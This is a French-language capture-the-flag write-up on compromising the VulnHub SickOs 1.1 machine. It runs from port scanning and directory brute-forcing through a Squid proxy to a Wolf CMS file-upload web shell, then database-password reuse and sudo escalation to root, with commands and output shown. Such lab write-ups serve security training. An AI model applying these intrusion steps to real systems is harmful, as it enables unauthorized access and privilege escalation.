# Solution du CTF SickOs 1.1 de VulnHub

[SickOs: 1.1](https://www.vulnhub.com/entry/sickos-11,132/) est un CTF créé par [D4rk36](https://twitter.com/D4rk36) et téléchargeable sur VulnHub.

Comme vous le verrez par la suite il est simple mais requiert d'avoir les bonnes intuitions.

```
Nmap scan report for 192.168.57.5
Host is up (0.00065s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
3128/tcp open   http-proxy Squid http proxy 3.1.19
|_http-server-header: squid/3.1.19
|_http-title: ERROR: The requested URL could not be retrieved
8080/tcp closed http-proxy
MAC Address: 08:00:27:89:4A:39 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On a un port 3128 annoncé comme un proxy `Squid` et si on s'y rend avec notre navigateur il rale en effet parce qu'on ne lui a pas donné d'URL à récupérer.

On configure un Firefox pour qu'il utilise ce proxy et quand on demande http://127.0.0.1 on obtient :

```html
<h1>
BLEHHH!!!
</h1>
```

On enchaine avec un `gobuster` en spécifiant le proxy dans les options :

```shellsession
$ gobuster -u http://127.0.0.1/ -p http://192.168.57.5:3128/ -w /opt/fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://127.0.0.1/
[+] Threads      : 10
[+] Wordlist     : /opt/fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt
[+] Status codes : 200,204,301,302,307,403
[+] Proxy        : http://192.168.57.5:3128/
[+] Timeout      : 10s
=====================================================
2023/02/10 15:48:40 Starting gobuster
=====================================================
/index (Status: 200)
/connect (Status: 200)
/robots (Status: 200)
/server-status (Status: 200)
=====================================================
2023/02/10 15:49:18 Finished
=====================================================
```

Dans le `robots.txt` qui ressort il est mention de `/wolfcms`.

Sur exploit-db une recherche sur `wolfcms` ne retourne rien de bien intéressant mais avec `wolf cms` en deux mots je trouve cette vulnérabilité d'upload arbitraire :

[Wolf CMS - Arbitrary File Upload / Execution - PHP webapps Exploit](https://www.exploit-db.com/exploits/38000)

On suit l'une des URLs indiquée dans l'exploit et on arrive sur la page de login du CMS :

http://127.0.0.1/wolfcms/?/admin/

Là les identifiants `admin` / `admin` sont acceptés et on peut intuitivement aller dans la gestion des fichiers, créer un `shell.php` et l'éditer pour y placer une backdoor.

On retrouve alors notre shell dans le dossier public :

http://127.0.0.1/wolfcms/public/shell.php?cmd=id

Le fichier de configuration du CMS qu'on peut lire une fois un terminal récupéré contient un mot de passe :

```php
// Database settings:
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
define('TABLE_PREFIX', '');
```

Ce mot de passe est accepté pour l'utilisateur `sickos` présent sur le système. Ce dernier permet de passer `root` sans difficultés :

```shellsession
www-data@SickOs:/var/www/wolfcms$ su sickos
Password:
sickos@SickOs:/var/www/wolfcms$ id
uid=1000(sickos) gid=1000(sickos) groups=1000(sickos),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
sickos@SickOs:/var/www/wolfcms$ sudo -l
[sudo] password for sickos:
Matching Defaults entries for sickos on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sickos may run the following commands on this host:
    (ALL : ALL) ALL
sickos@SickOs:/var/www/wolfcms$ sudo su
root@SickOs:/var/www/wolfcms# id
uid=0(root) gid=0(root) groups=0(root)
root@SickOs:/var/www/wolfcms# cd /root
root@SickOs:~# ls
a0216ea4d51874464078c618298b1367.txt
root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying
```

Ce dessus, l'utilisateur fait partie du groupe `sudo`, on peut facilement passer root.

*Publié le 11 février 2023*
